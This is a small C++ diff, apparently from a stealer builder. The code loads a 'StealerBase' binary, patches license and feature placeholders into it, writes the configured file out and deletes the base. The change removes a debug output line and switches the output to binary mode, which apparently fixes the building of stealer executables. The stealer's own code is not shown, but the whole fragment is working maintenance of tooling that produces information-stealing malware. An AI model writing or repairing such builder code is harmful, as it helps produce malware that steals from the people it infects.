@@ -76,7 +76,6 @@ int main(int argc, char* argv[])
 			ifstream MyFile(StealerBase, std::ios::binary);
 			string AllBytes = string((istreambuf_iterator<char>(MyFile)),
 				(istreambuf_iterator<char>()));
-			ofstream MyDebug("C:\\Users\\zephy\\Downloads\\Dbug.txt");
 			string DummyLicense = "[zbuilder{zbuilder}]";
 			size_t DummyLicenseLocation = AllBytes.find(DummyLicense);
 			AllBytes.replace(DummyLicenseLocation, DummyLicense.length(), decrypt(License));
@@ -89,7 +88,7 @@ int main(int argc, char* argv[])
 			size_t DummyFeaturesLocation = AllBytes.find(DummyFeatures);
 			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), Features);
 			string Location = RawLocation.substr(1, RawLocation.size() - 2);
-			ofstream WriteFile(Location, std::ofstream::trunc);
+			ofstream WriteFile(Location, std::ofstream::trunc | std::ios::binary);
 			WriteFile << AllBytes;
 			remove(StealerBase.c_str());
 		}
